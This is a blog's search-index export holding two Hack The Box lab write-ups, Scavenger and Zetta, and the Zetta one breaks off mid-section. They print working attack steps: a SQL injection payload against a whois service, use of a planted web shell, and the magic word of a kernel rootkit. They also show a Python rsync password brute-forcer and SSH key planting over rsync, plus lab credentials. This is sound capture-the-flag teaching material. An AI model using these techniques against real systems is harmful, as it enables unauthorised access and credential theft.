[{"categories":["hackthebox"],"content":"Here I will explain my path for Scavenger box from Hack The Box.","date":"2020-02-29","objectID":"/scavenger/","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"HTB:Scavenger Scavenger box was the hardest box after Zetta box. It falls under linux and hard category. Here, everything was all about enumeration, enumeration and enumeration. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using whois service and dns zone transfer(axfr) along with ftp by analyzing the .pcap file then used LKM to read root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root). ","date":"2020-02-29","objectID":"/scavenger/:1:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Box Details In above picture it’s ip is 10.10.10.155, I added it to /etc/hosts as scavenger.htb. Let’s solve this box. ","date":"2020-02-29","objectID":"/scavenger/:2:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner, nmap to see the open port and service which shows # Nmap 7.80 scan initiated Thu Feb 27 23:24:41 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.155 Nmap scan report for www.supersechosting.htb (10.10.10.155) Host is up (0.29s latency). Not shown: 993 filtered ports PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0) | ssh-hostkey: | 2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA) | 256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA) |_ 256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519) 25/tcp open smtp Exim smtpd 4.89 | smtp-commands: ib01.supersechosting.htb Hello www.supersechosting.htb [10.10.14.243], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, |_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 43/tcp open whois? | fingerprint-strings: | GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: | % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 | more information on SUPERSECHOSTING, visit http://www.supersechosting.htb | This query returned 0 object | SSLSessionReq, TLSSessionReq, TerminalServerCookie: | % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 | more information on SUPERSECHOSTING, visit http://www.supersechosting.htb |_ 1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like' 53/tcp open domain ISC BIND 9.10.3-P4 (Debian Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Debian 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: SuperSecHosting 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port43-TCP:V=7.80%I=7%D=2/27%Time=5E57FEF1%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,A9,\"%\\x20SUPERSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@Maria SF:DB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING SF:,\\x20visit\\x20http://www\\.supersechosting\\.htb\\r\\n%\\x20This\\x20query\\x2 SF:0returned\\x200\\x20object\\r\\n\")%r(GetRequest,A9,\"%\\x20SUPERSECHOSTING\\x2 SF:0WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20i SF:nformation\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://www\\.supersecho SF:sting\\.htb\\r\\n%\\x20This\\x20query\\x20returned\\x200\\x20object\\r\\n\")%r(HTT SF:POptions,A9,\"%\\x20SUPERSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@Maria SF:DB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING SF:,\\x20visit\\x20http://www\\.supersechosting\\.htb\\r\\n%\\x20This\\x20query\\x2 SF:0returned\\x200\\x20object\\r\\n\")%r(RTSPRequest,A9,\"%\\x20SUPERSECHOSTING\\x SF:20WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20 SF:information\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://www\\.supersech SF:osting\\.htb\\r\\n%\\x20This\\x20query\\x20returned\\x200\\x20object\\r\\n\")%r(He SF:lp,A9,\"%\\x20SUPERSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\. SF:1\\.37\\r\\n%\\x20for\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING,\\x20v SF:isit\\x20http://www\\.supersechosting\\.htb\\r\\n%\\x20This\\x20query\\x20retur SF:ned\\x200\\x20object\\r\\n\")%r(SSLSessionReq,103,\"%\\x20SUPERSECHOSTING\\x20W SF:HOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20inf SF:ormation\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://www\\.supersechost SF:ing\\.htb\\r\\n1267\\x20\\(HY000\\):\\x20Illegal\\x20mix\\x20of\\x20collations\\x2 SF:0\\(utf8mb4_general_ci,IMPLICIT\\)\\x20and\\x20\\(utf8_general_ci,COERCIBLE\\ SF:)\\x20for\\x20operation\\x20'like'\")%r(TerminalServerCookie,103,\"%\\x20SUPE SF:RSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20fo SF:r\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://w SF:ww\\.supersechosting\\.htb\\r\\n1267\\x20\\(HY000\\):\\x20Illegal\\x20mix\\x20of\\ SF:x20collations\\x20\\(utf8mb4_general_ci,IMPLICIT\\)\\x20and\\x20\\(utf8_gener SF:al_ci,COE","date":"2020-02-29","objectID":"/scavenger/:3:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Web Enumeration scavenger.htb After I noticed port 80 was opened I visited that site and got this as output. Front page of ScavengerFrontpage of Scavenger \" Front page of Scavenger From above picture, I got an vhost config problem which indicated hostname problem now I had to find another hostname. For that, I went back to nmap scan where I got 6 opened port and searched every opened port for vulnerability but got nothing since all were rabbit hole except port 43 of whois service. You can visit here for more about whois. From this I made simple payload. ","date":"2020-02-29","objectID":"/scavenger/:3:1","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Sqli in WHois Service root@gr4n173:~$ whois -h 10.10.10.155 -p 43 \"scavenger.htb\" % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 % for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb % This query returned 0 object From here I got new domain name and added that domain name in /etc/hosts in same ip 10.10.10.155. After adding that Ip I visited that site and got this as result. Supersec Hosting PageSupersec hosting page \" Supersec Hosting Page this way I can browse a website. Here, I got nothing so I had to search more about whois service. I made payload to inject sqli in whois service to extract the files from database as. root@gr4n174:~$ whois -h 10.10.10.155 -p 43 \"l33t') or 1=1#\" SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 % for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb % This query returned 4 object Domain Name: SUPERSECHOSTING.HTB Registrar WHOIS Server: whois.supersechosting.htb Registrar URL: http://www.supersechosting.htb Updated Date: 2018-02-21T18:36:40Z Creation Date: 1997-09-15T04:00:00Z Registry Expiry Date: 2020-09-14T04:00:00Z Registrar: SuperSecHosting Inc. Registrar IANA ID: 292 Registrar Abuse Contact Email: abusecomplaints@supersechosting.htb Registrar Abuse Contact Phone: +1.999999999 Name Server: NS1.SUPERSECHOSTING.HTB DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/ \u003e\u003e\u003e Last update of whois database: 2018-12-05T14:11:05Z \u003c\u003c\u003c For more information on Whois status codes, please visit https://icann.org/epp NOTICE: The expiration date displayed in this record is the date the registrar's sponsorship of the domain name registration in the registry is currently set to expire. This date does not necessarily reflect the expiration date of the domain name registrant's agreement with the sponsoring registrar. Users may consult the sponsoring registrar's Whois database to view the registrar's reported date of expiration for this registration. TERMS OF USE: You are not authorized to access or query our Whois database through the use of electronic processes that are high-volume and automated except as reasonably necessary to register domain names or modify existing registrations; the Data in VeriSign Global Registry ....... ........ This command extract everything that was saved in database using SQL Injection in WHOIS service since WHOIS service always needs to use database to store and extract the information. From above output of WHOIS command I got three more dns as www.justanotherblog.htb www.pwnhats.htb www.rentahacker.htb and I immediately added it to /etc/hosts. After that I can browser every website of it and final dns in /etc/hosts was root@gr4n173:~$ cat /etc/hosts 10.10.10.155 www.pwnhats.htb www.rentahacker.htb www.justanotherblog.htb www.supersechosting.htb ","date":"2020-02-29","objectID":"/scavenger/:3:2","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"justanotherblog.htb justanotherblogjustanotherblog \" justanotherblog ","date":"2020-02-29","objectID":"/scavenger/:3:3","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"pwnhats.htb ","date":"2020-02-29","objectID":"/scavenger/:3:4","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"rentahacker.htb rentahacker websiterentahacker website \" rentahacker website I searched every part of three website and basic method of Web Pentesting . Since there were many website of same ip so I used dns zone transfer (axfr) to know the subdomains and dig every domain as dig @10.10.10.155 pwnhats.htb axfr dig @10.10.10.155 rentahacker.htb axfrI got new subdomain of rentahacker.htb . For more info about dig you can visit dig. ","date":"2020-02-29","objectID":"/scavenger/:3:5","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Subdomain Enumeration root@gr4n174:~$ dig @10.10.10.155 rentahacker.htb axfr ; \u003c\u003c\u003e\u003e DiG 9.11.5-P4-5-Debian \u003c\u003c\u003e\u003e @10.10.10.155 rentahacker.htb axfr ; (1 server found) ;; global options: +cmd rentahacker.htb. 604800 IN SOA ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800 rentahacker.htb. 604800 IN NS ns1.supersechosting.htb. rentahacker.htb. 604800 IN MX 10 mail1.rentahacker.htb. rentahacker.htb. 604800 IN A 10.10.10.155 mail1.rentahacker.htb. 604800 IN A 10.10.10.155 sec03.rentahacker.htb. 604800 IN A 10.10.10.155 www.rentahacker.htb. 604800 IN A 10.10.10.155 rentahacker.htb. 604800 IN SOA ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800 ;; Query time: 883 msec ;; SERVER: 10.10.10.155#53(10.10.10.155) ;; WHEN: Fri Feb 28 00:09:07 +0545 2020 ;; XFR size: 8 records (messages 1, bytes 251) Since 10.10.10.155 was ip here I used it as name server and rentahacker.htb as a url for dns zone transfer using axfr. Now sec03.rentahacker.htb was added in /etc/hoststoo. ","date":"2020-02-29","objectID":"/scavenger/:3:6","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"sec03.rentahacker.htb After that, I searched for directory using dirsearch as root@gr4n173:~$ ./dirsearch.py -u http://sec03.rentahacker.htb/ -e html,txt,php,pcap,bzip,tar,bak Here I got shell.php as an interesting dir. Then, searched for parameter in shell.php?FUZZ= where I used ffuf tool . root@gr4n173:~$ffuf -w ~/Downloads/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ=id /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v0.12 ________________________________________________ :: Method : GET :: URL : http://sec03.rentahacker.htb/shell.php?FUZZ=id :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ password [Status: 200, Size: 0, Words: 1, Lines: 1] email [Status: 200, Size: 0, Words: 1, Lines: 1] url [Status: 200, Size: 0, Words: 1, Lines: 1] type [Status: 200, Size: 0, Words: 1, Lines: 1] ..... hidden [Status: 200, Size: 61, Words: 3, Lines: 2] From here I got hidden as parameter and got ib01c03 as output in browser. This indicated I can now run commands from the browser. You can see the output below. ","date":"2020-02-29","objectID":"/scavenger/:3:7","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"RCE as ib01c03 ","date":"2020-02-29","objectID":"/scavenger/:4:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Users: ib01c03-\u003eib01ftp-\u003eib01c01 After getting web-shell I searched every possible part of that user and finally got mail in /var/mail/ directory i.e. ib01c03 with my cat I got this You can see the credentials username/password. I used that user/pass to login ftp and I m into ib01ftp user now. ","date":"2020-02-29","objectID":"/scavenger/:4:1","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"FTP ib01ftp-\u003eib01c01-\u003euser.txt root@gr4n173:~$ ftp www.supersechosting.htb Connected to www.supersechosting.htb. 220 (vsFTPd 3.0.3) Name (www.supersechosting.htb:bikram): ib01ftp 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls After alot searched in every directory I got incidents and ibo1c01_incident.pcap file inside ib01c01. Then downloaded it to my local machine for that I used below command. ftp\u003e get ib01c01_incident.pcap local: ib01c01_incident.pcap remote: ib01c01_incident.pcap 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes). 226 Transfer complete. 835084 bytes received in 6.58 secs (123.9393 kB/s) You can get .pcap file here: pcap. It would be a great idea if we try strings for .pcap file so I analyzed .pcap file with strings and got this result. root@gr4n173:~$ strings ib01c01_incident.pcap | grep passwd ajax=1\u0026token=\u0026controller=AdminLogin\u0026submitLogin=1\u0026passwd=pwnhats.htb\u0026email=admin%40pwnhats.htb\u0026redirect=http%3A%2F%2Fwww.pwnhats.htb%2Fadmin530o6uisg%2F%26token%3De44d0ae2213d01986912abc63712a05b \u003clabel class=\"control-label\" for=\"passwd\"\u003e \u003cinput name=\"passwd\" type=\"password\" id=\"passwd\" class=\"form-control\" value=\"\" tabindex=\"2\" placeholder=\"\u0026#xf084 Password\" /\u003e ajax=1\u0026token=\u0026controller=AdminLogin\u0026submitLogin=1\u0026passwd=GetYouAH4t%21\u0026email=pwnhats%40pwnhats.htb\u0026redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05b From here I got passwd GetYouAH4t%21 where %21=! so GetYouAH4t!. So basically we had to give a try any commands for any file. I tried this passin every user which I got from ftp ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwx------ 5 1001 1004 4096 Feb 28 06:23 ib01c01 drwx------ 3 1002 1004 4096 Dec 11 2018 ib01c02 drwx------ 4 1003 1004 4096 Jan 30 2019 ib01c03 dr-xrwx--- 3 1005 1000 4096 Dec 10 2018 ib01ftp drwx------ 3 1004 1000 4096 Dec 10 2018 ib01www drwx------ 2 1000 1000 4096 Feb 02 2019 support Finally I m into ib01c01 user on ls I got user.txt and downloaded to my local machine using get ftp\u003e get user.txt local: user.txt remote: user.txt No control connection for command: Success root@gr4n173:~$ cat user.txt 6f8a8a************ This way I got the user.txt file without getting shell for user. Unprivelege-\u003e Privilege Escalation ftp-\u003eib01c01-\u003e.pcap root@gr4n173:~$ ftp www.supersechosting.htb Connected to www.supersechosting.htb. 220 (vsFTPd 3.0.3) Name (www.supersechosting.htb:bikram): ib01c01 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw------- 1 1001 1004 32 Jan 30 2019 access.txt -rw-r--r-- 1 1001 1004 68175351 Dec 07 2018 prestashop_1.7.4.4.zip -rw-r----- 1 0 1004 33 Dec 07 2018 user.txt drwxr-xr-x 26 1001 1004 4096 Dec 10 2018 www 226 Directory send OK. While doing enumeration it would be better if you analyze/use the files which was found before. So I analyzed .pcap file with wireshark and got file root.c . Wireshark: File-\u003eExport Objects-\u003eHTTP Then, I downloaded it in my local machine. You can get file here root.c. After analyzing this file I noticed that it is Kernel Rootkit. There is a saying \"Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree\" and found really good source for it you can visit here: detail. LKM-\u003e ‘magic’-\u003e Root After reading above blog I noticed that I should had root.ko file and a word magic. At first, I searched for word magic in root.c file and got g0tR0ot. I tried with that word in browser from previous user ib01c03with payload as and got same user so word magic was changed. For that I searched that word in every part of home dir of ib01c01 and found old school way of","date":"2020-02-29","objectID":"/scavenger/:4:2","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Alternative Method to Root ","date":"2020-02-29","objectID":"/scavenger/:5:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Reverse Engineering Though I got the root from simple way and I tried other way to get root. As root.ko file was ELF file and I love reversing the ELF file so I analyzed using my latest favorite tool ghidra. I opened it using ghidra if you are unfamiliar with ghidra tool you can see more about it here: ghidra. From the analysis of file root.c word magic was in function root_write(). So I checked that function in ghidra and got below as result. There I saw three variables as local_31 local_2d local_28 which was defined already. But these variable was defined in little Indian format. If you are unfamiliar with this format then don’t worry I will explain in my next blog. local_31 = 0x743367; # g3t local_2d = 0x76317250; # Pr1v local_28 = 0x746f3052743067; # g0tR0ot And on analyzing more about that function I got something fishy in snprintf((char *)\u0026local_28,8,\"%s%s\",\u0026local_31,\u0026local_2d);. In the above function from ghidra I found that value of local_28 is replaced with local_31+local_2d. If you are unfamiliar about snprintf function you can visit here snprintf. So my final magic word was g3tPr1v. Using this as above in browser, I got the root.txt file. This way I got the root of scavenger box and learned alot from this box. So I would like to thank creator of this box ompamo for such an awesome box. Especially enumeration, enumeration and enumeration was awesome. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can see more blog at my medium here: gr4n173. ","date":"2020-02-29","objectID":"/scavenger/:5:1","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Zetta box from Hack The Box.","date":"2020-02-22","objectID":"/zetta/","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":" HTB:Zetta Zetta box was the hardest box till I have done. It falls under linux and hard category. Especially to read the root flag is a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using ipv6 and rsync service by uploading my authorized_keys then I used postgres along with logger to read root.txt .I’ll show all my payload(including that didn’t work in initial deployment to get the root). ","date":"2020-02-22","objectID":"/zetta/:0:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Box Details Description of the boxdescription of the box \" Description of the box In above picture it’s ip is 10.10.10.156, I added it to /etc/hosts as zetta.htb. Let’s solve this box. ","date":"2020-02-22","objectID":"/zetta/:1:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner nmap to see the open port and service which shows FTP(TCP 21),SSH(TCP 22) and HTTP(TCP 80). root@gr4n173:~$ nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156 Nmap 7.80 scan initiated Sat Jan 25 22:29:29 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156 Nmap scan report for zetta.htb (10.10.10.156) Host is up (0.29s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Pure-FTPd 22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0) | ssh-hostkey: | 2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA) | 256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA) |_ 256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519) 80/tcp open http nginx |_http-title: Ze::a Share Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Sat Jan 25 22:30:28 2020 -- 1 IP address (1 host up) scanned in 59.55 seconds ","date":"2020-02-22","objectID":"/zetta/:2:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Web Enumeration zetta.htb After I noticed port 80 http opened I visited that site and got this as output. Front PageFront Page \" Front Page Then, I searched every part of this website and found something interesting things in STUFF TO DO Native FTP We support native FTP with FXP enabled. We also support RFC2428. and also the credentials username/password for FTP service as below. ![Details of FTP](public/images/ftp_details.jpg “Details of FTP) ","date":"2020-02-22","objectID":"/zetta/:2:1","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"FTP With this detail I m into the FTP server now as. root@gr4n173:~$ ftp zetta.htb Connected to zetta.htb. 220---------- Welcome to Pure-FTPd [privsep] [TLS] ---------- 220-You are user number 1 of 500 allowed. 220-Local time is now 08:23. Server port: 21. 220-This is a private system - No anonymous login 220-IPv6 connections are also welcome on this server. 220 You will be disconnected after 15 minutes of inactivity. Name (zetta.htb:bikram): b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP 331 User b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP OK. Password required Password: 230-This server supports FXP transfers 230-OK. Current restricted directory is 230-0 files used (0%) - authorized: 10 files 230 0 Kbytes used (0%) - authorized: 1024 Kb Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e here you can see FXP transfers supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this RFC2428. At first I had set tcpdump listner as root@gr4n173:~$tcpdump -lni tun0 -vvvvvvvv ip6 tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes Now using this commands:- ftp\u003e quote EPRT |1|10.10.10.156|2222| 200-FXP transfer: from 10.10.16.25 to 10.10.10.156 200 PORT command successful ftp\u003e quote EPRT |2|2001:41d0:52:a00::e66|2222| 200-FXP transfer: from 10.10.10.156 to 2001:41d0:52:a00::e66%176 200 PORT command successful ftp\u003e quote EPRT |1|10.10.10.156|2222| 200-FXP transfer: from 2001:41d0:52:a00::e66%176 to 10.10.10.156 200 PORT command successful ftp\u003e quote EPRT |2|dead:beef:2::11df|2222| 200-FXP transfer: from 10.10.10.156 to dead:beef:2::11df%160 200 PORT command successful ftp\u003e LIST ?Invalid command ftp\u003e quote LIST 425 Could not open data connection to port 2222: Connection refused ftp\u003e from first command quote EPRT |1|10.10.10.156|2222| quote EPRT |2|2001:41d0:52:a00::e66|2222| this specifies server should use IPV4 to open a data connection to host of zetta.htb on port 2222 and similar for second command IP6 . Now in third command IPV4 is activated again and IPV6 of my own ip which I got from ifconfig is used. This was I got IPV6 as dead:beef::250:56ff:febd:a9a4 root@gr4n173:~$ tcpdump -lni tun0 -vvvvvvvv ip6 tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 21:57:25.140243 IP6 (flowlabel 0x924d3, hlim 63, next-header TCP (6) payload length: 40) dead:beef::250:56ff:febd:a9a4.51208 \u003e dead:beef:2::11df.2222: Flags [S], cksum 0x9b6f (correct), seq 2652376284, win 28800, options [mss 1337,sackOK,TS val 1847133177 ecr 0,nop,wscale 7], length 0 21:57:25.140287 IP6 (flowlabel 0x55bf9, hlim 64, next-header TCP (6) payload length: 20) dead:beef:2::11df.2222 \u003e _dead:beef::250:56ff:febd:a9a4_.51208: Flags [R.], cksum 0xe556 (correct), seq 0, ack 2652376285, win 0, length 0 I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IPV6 and got this with rsync service at port 8730 as root@gr4n173:~$nmap -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 22:23 +0545 Nmap scan report for dead:beef::250:56ff:febd:a9a4 Host is up (0.28s latency). Not shown: 9996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Pure-FTPd 22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0) | ssh-hostkey: | 2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA) | 256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA) |_ 256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519) 80/tcp open http nginx |_http-title: Ze::a Share 8730/tcp open rsync (protocol version 31) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | address-info: | IPv6 EUI-64: | MAC address: | address: 00:50:56:bd:a9:a4 |_ manuf: VMware Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 hos","date":"2020-02-22","objectID":"/zetta/:2:2","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Rsync-\u003e authorized_keys-\u003e User.txt I googled and read everything regarding the service rsync and made some script with nmap as root@gr4n173:~$ nmap -sV -6 --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 dead:beef::250:56ff:febd:a9a4 but this didn’t work though so I searched other way to get remote rsync to the server and finally this worked for me. root@gr4n173:~$rsync -av rsync://[dead:beef::250:56ff:febd:a9a4]:8730/etc/rsyncd.conf /tmp/rsyncd.conf ","date":"2020-02-22","objectID":"/zetta/:3:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Script in Python From here I got username roy now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from here #!/bin/python3 import pexpect p=open('/usr/share/wordlists/rockyou.txt','r') for x in p: login = pexpect.spawn('rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:a9a4]:8730/home_roy/.ssh ssh') login.expect('Password:') login.sendline(x) if \"auth failed on module\" not in login.read(): break else: print(x) from here I got the password of user roy as :- computer Now I tried to download the id_rsa key of roy user but that fails since roy didn’t have id_rsa key instead used my own authorized_keys to get the shell of user roy. root@gr4n173:~$rsync -rdt authorized_keys -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:7d3b]:8730/home_roy/.ssh Here now authorized_keys let me to shell of user roy and also I had used the user roy along with it’s password computer. ","date":"2020-02-22","objectID":"/zetta/:3:1","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Shell as roy Finally I got the shell of roy and got the user.txt as root@gr4n173:~$ ssh roy@zetta.htb Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 Last login: Sat Feb 15 22:05:58 2020 from 10.10.14.193 roy@zetta:~$ whoami roy roy@zetta:~$ ls user.txt roy@zetta:~$ cat user.txt a575bdb************************* ","date":"2020-02-22","objectID":"/zetta/:4:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Postgresql Exploit After I got user.txt i.e. roy shell ,I found .tudu.xml file in home directory of roy where many to do list was written. ....... \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eCheck postgresql log for errors after configuration\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"yes\" collapse=\"no\"\u003e 